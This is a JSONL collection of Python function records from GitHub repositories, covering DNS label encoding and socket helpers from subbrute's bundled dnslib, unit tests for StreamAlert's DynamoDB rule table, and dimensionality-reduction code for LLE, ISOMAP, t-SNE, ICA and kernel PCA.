{"docstring": "\"\"\"\n    Helper function to send/receive DNS TCP request\n    (in/out packets will have prepended TCP length header)\n\"\"\"\n", "func_signal": "def send_tcp(data,host,port):\n", "code": "sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nsock.connect((host,port))\nsock.sendall(data)\nresponse = sock.recv(8192)\nlength = struct.unpack(\"!H\",bytes(response[:2]))[0]\nwhile len(response) - 2 < length:\n    response += sock.recv(8192)\nsock.close()\nreturn response", "path": "subbrute/dnslib/proxy.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Selectively enable log hooks depending on log argument\n    (comma separated list of hooks to enable/disable)\n\n    - If empty enable default log hooks\n    - If entry starts with '+' (eg. +send,+recv) enable hook\n    - If entry starts with '-' (eg. -data) disable hook\n    - If entry doesn't start with +/- replace defaults\n\n    Prefix argument enables/disables log prefix\n\"\"\"\n", "func_signal": "def __init__(self,log=\"\",prefix=True):\n", "code": "default = [\"request\",\"reply\",\"truncated\",\"error\"]\nlog = log.split(\",\") if log else []\nenabled = set([ s for s in log if s[0] not in '+-'] or default)\n[ enabled.add(l[1:]) for l in log if l.startswith('+') ]\n[ enabled.discard(l[1:]) for l in log if l.startswith('-') ]\nfor l in ['log_recv','log_send','log_request','log_reply',\n          'log_truncated','log_error','log_data']:\n    if l[4:] not in enabled:\n        setattr(self,l,self.log_pass)\nself.prefix = prefix", "path": "subbrute/dnslib/server.py", "commit_date": "2017-02-12 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Create DNS label instance \n\n    Label can be specified as:\n    - a list/tuple of byte strings\n    - a byte string (split into components separated by b'.')\n    - a unicode string which will be encoded according to RFC3490/IDNA\n\"\"\"\n", "func_signal": "def __init__(self,label):\n", "code": "if type(label) == DNSLabel:\n    self.label = label.label\nelif type(label) in (list,tuple):\n    self.label = tuple(label)\nelse:\n    if not label or label in (b'.','.'):\n        self.label = ()\n    elif type(label) is not bytes:\n        self.label = tuple(label.encode(\"idna\").\\\n                        rstrip(b\".\").split(b\".\"))\n    else:\n        self.label = tuple(label.rstrip(b\".\").split(b\".\"))", "path": "subbrute/dnslib/label.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Helper function to send/receive DNS UDP request\n\"\"\"\n", "func_signal": "def send_udp(data,host,port):\n", "code": "sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\nsock.sendto(data,(host,port))\nresponse,server = sock.recvfrom(8192)\nsock.close()\nreturn response", "path": "subbrute/dnslib/proxy.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Append s to end of data & increment offset\n\"\"\"\n", "func_signal": "def append(self,s):\n", "code": "self.offset += len(s)\nself.data += s", "path": "subbrute/dnslib/buffer.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Gen len bytes at current offset (& increment offset)\n\"\"\"\n", "func_signal": "def get(self,length):\n", "code": "if length > self.remaining():\n    raise BufferError(\"Not enough bytes [offset=%d,remaining=%d,requested=%d]\" %\n            (self.offset,self.remaining(),length))\nstart = self.offset\nend = self.offset + length\nself.offset += length\nreturn bytes(self.data[start:end])", "path": "subbrute/dnslib/buffer.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Decode label at current offset in buffer (following pointers\n    to cached elements where necessary)\n\"\"\"\n", "func_signal": "def decode_name(self,last=-1):\n", "code": "label = []\ndone = False\nwhile not done:\n    (length,) = self.unpack(\"!B\")\n    if get_bits(length,6,2) == 3:\n        # Pointer\n        self.offset -= 1\n        pointer = get_bits(self.unpack(\"!H\")[0],0,14)\n        save = self.offset\n        if last == save:\n            raise BufferError(\"Recursive pointer in DNSLabel [offset=%d,pointer=%d,length=%d]\" % \n                    (self.offset,pointer,len(self.data)))\n        if pointer < self.offset:\n            self.offset = pointer\n        else:\n            # Pointer can't point forwards\n            raise BufferError(\"Invalid pointer in DNSLabel [offset=%d,pointer=%d,length=%d]\" % \n                    (self.offset,pointer,len(self.data)))\n        label.extend(self.decode_name(save).label)\n        self.offset = save\n        done = True\n    else:\n        if length > 0:\n            l = self.get(length)\n            try:\n                l.decode()\n            except UnicodeDecodeError:\n                raise BufferError(\"Invalid label <%s>\" % l)\n            label.append(l)\n        else:\n            done = True\nreturn DNSLabel(label)", "path": "subbrute/dnslib/label.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Pack data at end of data according to fmt (from struct) & increment\n    offset\n\"\"\"\n", "func_signal": "def pack(self,fmt,*args):\n", "code": "self.offset += struct.calcsize(fmt)\nself.data += struct.pack(fmt,*args)", "path": "subbrute/dnslib/buffer.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Prepend name to label \n\"\"\"\n", "func_signal": "def add(self,name):\n", "code": "new = DNSLabel(name)\nif self.label:\n    new.label += self.label\nreturn new", "path": "subbrute/dnslib/label.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Unpack data at current offset according to fmt (from struct)\n\"\"\"\n", "func_signal": "def unpack(self,fmt):\n", "code": "try:\n    data = self.get(struct.calcsize(fmt))\n    return struct.unpack(fmt,data)\nexcept struct.error as e:\n    raise BufferError(\"Error unpacking struct '%s' <%s>\" % \n            (fmt,binascii.hexlify(data).decode()))", "path": "subbrute/dnslib/buffer.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Initialise resolver from zone file. \n    Stores RRs as a list of (label,type,rr) tuples\n    If 'glob' is True use glob match against zone file \n\"\"\"\n", "func_signal": "def __init__(self,zone,glob=False):\n", "code": "self.zone = [(rr.rname,QTYPE[rr.rtype],rr) for rr in RR.fromZone(zone)]\nself.glob = glob\nself.eq = 'matchGlob' if glob else '__eq__'", "path": "subbrute/dnslib/zoneresolver.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Example resolver - respond to all requests with NXDOMAIN\n\"\"\"\n", "func_signal": "def resolve(self,request,handler):\n", "code": "reply = request.reply()\nreply.header.rcode = getattr(RCODE,'NXDOMAIN')\nreturn reply", "path": "subbrute/dnslib/server.py", "commit_date": "2017-02-12 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Encode and store label with no compression \n    (needed for RRSIG)\n\"\"\"\n", "func_signal": "def encode_name_nocompress(self,name):\n", "code": "if not isinstance(name,DNSLabel):\n    name = DNSLabel(name)\nif len(name) > 253:\n    raise DNSLabelError(\"Domain label too long: %r\" % name)\nname = list(name.label)\nwhile name:\n    element = name.pop(0)\n    if len(element) > 63:\n        raise DNSLabelError(\"Label component too long: %r\" % element)\n    self.pack(\"!B\",len(element))\n    self.append(element)\nself.append(b'\\x00')", "path": "subbrute/dnslib/label.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Encode label and store at end of buffer (compressing\n    cached elements where needed) and store elements\n    in 'names' dict\n\"\"\"\n", "func_signal": "def encode_name(self,name):\n", "code": "if not isinstance(name,DNSLabel):\n    name = DNSLabel(name)\nif len(name) > 253:\n    raise DNSLabelError(\"Domain label too long: %r\" % name)\nname = list(name.label)\nwhile name:\n    if tuple(name) in self.names:\n        # Cached - set pointer\n        pointer = self.names[tuple(name)]\n        pointer = set_bits(pointer,3,14,2)\n        self.pack(\"!H\",pointer)\n        return\n    else:\n        self.names[tuple(name)] = self.offset\n        element = name.pop(0)\n        if len(element) > 63:\n            raise DNSLabelError(\"Label component too long: %r\" % element)\n        self.pack(\"!B\",len(element))\n        self.append(element)\nself.append(b'\\x00')", "path": "subbrute/dnslib/label.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Return True if label suffix matches \n\"\"\"\n", "func_signal": "def matchSuffix(self,suffix):\n", "code": "suffix = DNSLabel(suffix)\nreturn self.label[-len(suffix.label):] == suffix.label", "path": "subbrute/dnslib/label.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Modify data at offset `ptr` \n\"\"\"\n", "func_signal": "def update(self,ptr,fmt,*args):\n", "code": "s = struct.pack(fmt,*args)\nself.data[ptr:ptr+len(s)] = s", "path": "subbrute/dnslib/buffer.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Strip suffix from label\n\"\"\"\n", "func_signal": "def stripSuffix(self,suffix):\n", "code": "suffix = DNSLabel(suffix)\nif self.label[-len(suffix.label):] == suffix.label:\n    return DNSLabel(self.label[:-len(suffix.label)])\nelse:\n    return self", "path": "subbrute/dnslib/label.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"Rule Table - Load Remote State of Rules, Existing Database\"\"\"\n", "func_signal": "def test_load_remote_state_state(self, window_mock):\n", "code": "window_mock.return_value = ('2018-04-21T02:23:13.0Z', '2018-04-23T02:23:13.0Z')\n# Create 2 local rules and add them to the currently empty\nself._create_local_rules(2)\nself.rule_table._add_new_rules()\n\n# window_mock.return_value = ('start-staged-date', 'end-staged-date')\n# Create 2 local rules and add them to the currently empty\nself._create_local_rule_with_name('now_staged_rule')\nself.rule_table._add_new_rules()\n\nexpected_state = {\n    'fake_rule_00': {'Staged': False},\n    'fake_rule_01': {'Staged': False},\n    'now_staged_rule': {\n        'Staged': True,\n        'StagedAt': datetime(year=2018, month=4, day=21, hour=2, minute=23, second=13),\n        'StagedUntil': datetime(year=2018, month=4, day=23, hour=2, minute=23, second=13)\n    }\n}\n\nstate = self.rule_table._load_remote_state()\nassert_equal(state, expected_state)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - DynamoDB Record, New Database\"\"\"\n", "func_signal": "def test_dynamo_record_init(self):\n", "code": "expected_record = {\n    'RuleName': 'foo_rule',\n    'Staged': False\n}\n\nrecord = self.rule_table._dynamo_record('foo_rule', True)\nassert_equal(record, expected_record)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Remote and Not Local Rule Names\"\"\"\n", "func_signal": "def test_remote_not_local_names(self):\n", "code": "for rule_name in {'test_rule_01', 'test_rule_02'}:\n    self._create_local_rule_with_name(rule_name)\n\nexpected_result = {'remote_rule_01', 'remote_rule_02'}\nfor rule_name in expected_result:\n    self._create_db_rule_with_name(rule_name)\n\nassert_equal(self.rule_table.remote_not_local, expected_result)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Toggle Staging, Nonexistent Rule\"\"\"\n", "func_signal": "def test_toggle_staged_state_nonexistent(self, log_mock):\n", "code": "rule_name = 'bad_rule'\n\n# Try to toggle the state of the non-existent rule to staged\nself.rule_table.toggle_staged_state(rule_name, True)\nlog_mock.assert_called_with(\n    'Staging status for rule \\'%s\\' cannot be set to %s; rule does not exist',\n    rule_name,\n    True\n)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Add New Rules\"\"\"\n", "func_signal": "def test_add_new_rules(self):\n", "code": "self._create_local_rules(2)\nself.rule_table._add_new_rules()\nassert_equal(self.rule_table._table.item_count, 2)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Toggle Staging, Already Staged (Update Window)\"\"\"\n", "func_signal": "def test_toggle_staged_state_update(self, log_mock):\n", "code": "rule_name = 'staged_rule'\nstaged = True\nself.rule_table._table.put_item(Item={\n    'RuleName': rule_name,\n    'Staged': staged,\n    'StagedAt': '2018-01-01T01:01:01.000Z'\n})\n\n# Make sure the item that was added is staged\norig_item = self.rule_table._table.get_item(Key={'RuleName': rule_name})\nassert_equal(orig_item['Item']['Staged'], staged)\n\n# Try to toggle the state of the already staged rule to staged\n# This should implicitly update the staging window\nself.rule_table.toggle_staged_state(rule_name, staged)\nlog_mock.assert_called_with(\n    'Rule \\'%s\\' is already staged and will have its staging window updated',\n    rule_name\n)\n\n# Make sure the item is still staged\nnew_item = self.rule_table._table.get_item(Key={'RuleName': rule_name})\nassert_equal(new_item['Item']['Staged'], True)\nassert_not_equal(orig_item['Item']['StagedAt'], new_item['Item']['StagedAt'])", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Local Rule Names\"\"\"\n", "func_signal": "def test_local_rule_names(self):\n", "code": "expected_result = {'test_rule_01', 'test_rule_02', 'test_rule_03'}\nfor rule_name in expected_result:\n    self._create_local_rule_with_name(rule_name)\n\nassert_equal(self.rule_table.local_rule_names, expected_result)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Create mock table and rules\"\"\"\n# pylint: disable=attribute-defined-outside-init\n", "func_signal": "def setup(self):\n", "code": "self.dynamo_mock = mock_dynamodb2()\nself.dynamo_mock.start()\nsetup_mock_rules_table(_RULES_TABLE)\nself.rule_table = rule_table.RuleTable(_RULES_TABLE)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - DynamoDB Record, Existing Database\"\"\"\n", "func_signal": "def test_dynamo_record(self, window_mock):\n", "code": "window_mock.return_value = ('staged-at-date', 'staged-until-date')\nexpected_record = {\n    'RuleName': 'foo_rule',\n    'Staged': True,\n    'StagedAt': 'staged-at-date',\n    'StagedUntil': 'staged-until-date'\n}\n\nrecord = self.rule_table._dynamo_record('foo_rule', False)\nassert_equal(record, expected_record)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Toggle Staging, ClientError Occurred\"\"\"\n", "func_signal": "def test_toggle_staged_state_error(self):\n", "code": "rule_name = 'test_rule'\nself._create_db_rule_with_name(rule_name, True)\nwith patch.object(self.rule_table._table, 'update_item',\n                  side_effect=ClientError({'Error': {'Code': 'TEST'}}, 'UpdateItem')):\n    assert_raises(ClientError, self.rule_table.toggle_staged_state, rule_name, True)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Delete New Rules\"\"\"\n# Create 2 local rules and add them to the table\n", "func_signal": "def test_delete_old_rules(self):\n", "code": "original_count = 2\nself._create_local_rules(original_count)\nself.rule_table._add_new_rules()\n\n# Delete a local rule from the tracking dictionary\ndel rule_module.Rule._rules['fake_rule_01']\n\n# Ensure the remote state is updated for the deletion of a rule\nself.rule_table._del_old_rules()\nassert_equal(len(self.rule_table._load_remote_state()), original_count-1)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Load Remote State of Rules, New Database\"\"\"\n# Create 2 local rules and add them to the table\n", "func_signal": "def test_load_remote_state_init(self):\n", "code": "self._create_local_rules(2)\nself.rule_table._add_new_rules()\n\nexpected_state = {\n    'fake_rule_00': {'Staged': False},\n    'fake_rule_01': {'Staged': False}\n}\n\nstate = self.rule_table._load_remote_state()\nassert_equal(state, expected_state)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Update\"\"\"\n", "func_signal": "def test_update(self):\n", "code": "rule_name = 'init_rule'\nself._create_db_rule_with_name(rule_name)\nassert_equal(self.rule_table._table.item_count, 1)\nself._create_local_rule_with_name('test_rule_01')\nself._create_local_rule_with_name('test_rule_02')\n\n# Run the update to ensure the old rule was deleted and the new rules are added\nself.rule_table.update()\nassert_equal(len(self.rule_table._load_remote_state()), 2)\nitem = self.rule_table._table.get_item(Key={'RuleName': rule_name})\nassert_equal(item.get('Item'), None)\nitem = self.rule_table._table.get_item(Key={'RuleName': 'test_rule_02'})\nassert_equal(item['Item']['RuleName'], 'test_rule_02')", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Destroy previously created rules\"\"\"\n", "func_signal": "def teardown(self):\n", "code": "rule_module.Rule._rules.clear()\nself.dynamo_mock.stop()", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Toggle Staging, Staged=True\"\"\"\n", "func_signal": "def test_toggle_staged_state_true(self):\n", "code": "rule_name = 'unstaged_rule'\nself._create_db_rule_with_name(rule_name)\n\n# Make sure the item that was added is not staged\nitem = self.rule_table._table.get_item(Key={'RuleName': rule_name})\nassert_equal(item['Item']['Staged'], False)\n\n# Try to toggle the state to staged\nself.rule_table.toggle_staged_state(rule_name, True)\n\n# Make sure the item is now staged\nitem = self.rule_table._table.get_item(Key={'RuleName': rule_name})\nassert_equal(item['Item']['Staged'], True)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Staged Window\"\"\"\n", "func_signal": "def test_staged_window(self, date_mock):\n", "code": "date_mock.utcnow.return_value = datetime(\n    year=2001, month=1, day=1, hour=12, minute=0, second=10, microsecond=123456)\n\nstaged_at, staged_until = self.rule_table._staged_window()\nassert_equal(staged_at, '2001-01-01T12:00:10.123456Z')\nassert_equal(staged_until, '2001-01-03T12:00:10.123456Z')", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Remote Rule Names\"\"\"\n", "func_signal": "def test_remote_rule_names(self):\n", "code": "expected_result = {'remote_rule_01', 'remote_rule_02', 'remote_rule_03'}\nfor rule_name in expected_result:\n    self._create_db_rule_with_name(rule_name)\n\nassert_equal(self.rule_table.remote_rule_names, expected_result)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Get Rule Info\"\"\"\n", "func_signal": "def test_get_rule_info(self):\n", "code": "rule_name = 'test_rule_01'\nself._create_db_rule_with_name(rule_name, True)\n\nexpected_result = {'Staged': True}\nassert_equal(self.rule_table.rule_info(rule_name), expected_result)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Remote Rule Info\"\"\"\n", "func_signal": "def test_remote_rule_info(self):\n", "code": "expected_result = {\n    'test_rule_01': {'Staged': False},\n    'test_rule_02': {'Staged': False},\n    'test_rule_03': {'Staged': False}\n}\nfor rule_name in expected_result:\n    self._create_db_rule_with_name(rule_name)\n\nassert_equal(self.rule_table.remote_rule_info, expected_result)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "\"\"\"Rule Table - Local and Not Remote Rule Names\"\"\"\n", "func_signal": "def test_local_not_remote_names(self):\n", "code": "for rule_name in {'remote_rule_01', 'remote_rule_02'}:\n    self._create_db_rule_with_name(rule_name)\n\nexpected_result = {'test_rule_01', 'test_rule_02'}\nfor rule_name in expected_result:\n    self._create_local_rule_with_name(rule_name)\n\nassert_equal(self.rule_table.local_not_remote, expected_result)", "path": "streamalert/tests/unit/streamalert/shared/test_rule_table.py", "commit_date": "2020-03-24 00:00:00", "repo_name": "airbnb/streamalert", "stars": 2823, "license": "apache-2.0", "language": "python", "size": 44430}
{"docstring": "'''\n\n:param data:(n_samples, n_features)\n:param n_dims: target n_dims\n:param n_neighbors: n nearest neighbors\n:return: (n_samples, n_dims)\n'''\n", "func_signal": "def lle(data, n_dims = 2, n_neighbors = 10):\n", "code": "N = get_n_neighbors(data, n_neighbors)\nn, D = data.shape\n\n# prevent Si to small\nif n_neighbors > D:\n    tol = 1e-3\nelse:\n    tol = 0\n\n# calculate W\nW = np.zeros((n_neighbors, n))\nI = np.ones((n_neighbors, 1))\nfor i in range(n):\n    Xi = np.tile(data[i], (n_neighbors, 1)).T\n    Ni = data[N[i]].T\n\n    Si = np.dot((Xi-Ni).T, (Xi-Ni))\n    # magic and why????\n    Si = Si+np.eye(n_neighbors)*tol*np.trace(Si)\n\n    Si_inv = np.linalg.pinv(Si)\n    wi = (np.dot(Si_inv, I))/(np.dot(np.dot(I.T, Si_inv), I)[0,0])\n    W[:, i] = wi[:,0]\n\nprint(\"Xi.shape\", Xi.shape)\nprint(\"Ni.shape\", Ni.shape)\nprint(\"Si.shape\", Si.shape)\n\nW_y = np.zeros((n, n))\nfor i in range(n):\n    index = N[i]\n    for j in range(n_neighbors):\n        W_y[index[j],i] = W[j,i]\n\nI_y = np.eye(n)\nM = np.dot((I_y - W_y), (I_y - W_y).T)\n\neig_val, eig_vector = np.linalg.eig(M)\nindex_ = np.argsort(np.abs(eig_val))[1:n_dims+1]\nprint(\"index_\", index_)\nY = eig_vector[:, index_]\nreturn Y", "path": "dimensionality_reduction_alo_codes/codes/LLE/LLE.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "# dist (n_samples, n_samples)\n", "func_signal": "def my_mds(dist, n_dims):\n", "code": "dist = dist**2\nn = dist.shape[0]\nT1 = np.ones((n,n))*np.sum(dist)/n**2\nT2 = np.sum(dist, axis = 1)/n\nT3 = np.sum(dist, axis = 0)/n\n\nB = -(T1 - T2 - T3 + dist)/2\n\neig_val, eig_vector = np.linalg.eig(B)\nindex_ = np.argsort(-eig_val)[:n_dims]\npicked_eig_val = eig_val[index_].real\npicked_eig_vector = eig_vector[:, index_]\n\nreturn picked_eig_vector*picked_eig_val**(0.5)", "path": "dimensionality_reduction_alo_codes/codes/ISOMAP/ISOMAP.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\u8ba1\u7b97perplexity, D\u662f\u8ddd\u79bb\u5411\u91cf\uff0c\nidx\u6307dist\u4e2d\u81ea\u5df1\u4e0e\u81ea\u5df1\u8ddd\u79bb\u7684\u4f4d\u7f6e\uff0cbeta\u662f\u9ad8\u65af\u5206\u5e03\u53c2\u6570\n\u8fd9\u91cc\u7684perp\u4ec5\u8ba1\u7b97\u4e86\u71b5\uff0c\u65b9\u4fbf\u8ba1\u7b97\n'''\n", "func_signal": "def cal_perplexity(dist, idx=0, beta=1.0):\n", "code": "prob = np.exp(-dist * beta)\n# \u8bbe\u7f6e\u81ea\u8eabprob\u4e3a0\nprob[idx] = 0\nsum_prob = np.sum(prob)\nif sum_prob < 1e-12:\n    prob = np.maximum(prob, 1e-12)\n    perp = -12\nelse:\n    perp = np.log(sum_prob) + beta * np.sum(dist * prob) / sum_prob\n    prob /= sum_prob\n\nreturn perp, prob", "path": "dimensionality_reduction_alo_codes/codes/T-SNE/TSNE.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "#black magic\n", "func_signal": "def do_decorrelation(W):\n", "code": "s, u = linalg.eigh(dot(W, W.T))\nreturn dot(dot(u * (1. / sqrt(s)), u.T), W)", "path": "dimensionality_reduction_alo_codes/codes/ICA/ICA.py", "commit_date": "2019-06-13 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\n\n:param data: (n_samples, n_features)\n:param n_dims: target n_dims\n:param kernel: kernel functions\n:return: (n_samples, n_dims)\n'''\n\n", "func_signal": "def kpca(data, n_dims=2, kernel = rbf):\n", "code": "K = kernel(data)\n#\nN = K.shape[0]\none_n = np.ones((N, N)) / N\nK = K - one_n.dot(K) - K.dot(one_n) + one_n.dot(K).dot(one_n)\n#\neig_values, eig_vector = np.linalg.eig(K)\nidx = eig_values.argsort()[::-1]\neigval = eig_values[idx][:n_dims]\neigvector = eig_vector[:, idx][:, :n_dims]\nprint(eigval)\neigval = eigval**(1/2)\nvi = eigvector/eigval.reshape(-1,n_dims)\ndata_n = np.dot(K, vi)\nreturn data_n", "path": "dimensionality_reduction_alo_codes/codes/PCA/KPCA.py", "commit_date": "2019-06-13 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "'''\u8ba1\u7b97pairwise \u8ddd\u79bb, x\u662fmatrix\n(a-b)^2 = a^2 + b^2 - 2*a*b\n'''\n", "func_signal": "def cal_pairwise_dist(x):\n", "code": "sum_x = np.sum(np.square(x), 1)\ndist = np.add(np.add(-2 * np.dot(x, x.T), sum_x).T, sum_x)\n#\u8fd4\u56de\u4efb\u610f\u4e24\u4e2a\u70b9\u4e4b\u95f4\u8ddd\u79bb\u7684\u5e73\u65b9\nreturn dist", "path": "dimensionality_reduction_alo_codes/codes/T-SNE/TSNE.py", "commit_date": "2020-01-28 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
{"docstring": "#zero mean\n", "func_signal": "def whiten(X):\n", "code": "X_mean = X.mean(axis=-1)\nX -= X_mean[:, newaxis]\n#whiten\nA = dot(X, X.transpose())\nD , E = linalg.eig(A)\nD2 = linalg.inv(array([[D[0], 0.0], [0.0, D[1]]], float32))\nD2[0,0] = sqrt(D2[0,0]); D2[1,1] = sqrt(D2[1,1])\nV = dot(D2, E.transpose())\nreturn dot(V, X), V", "path": "dimensionality_reduction_alo_codes/codes/ICA/ICA.py", "commit_date": "2019-06-13 00:00:00", "repo_name": "heucoder/dimensionality_reduction_alo_codes", "stars": 2185, "license": "apache-2.0", "language": "python", "size": 2211}
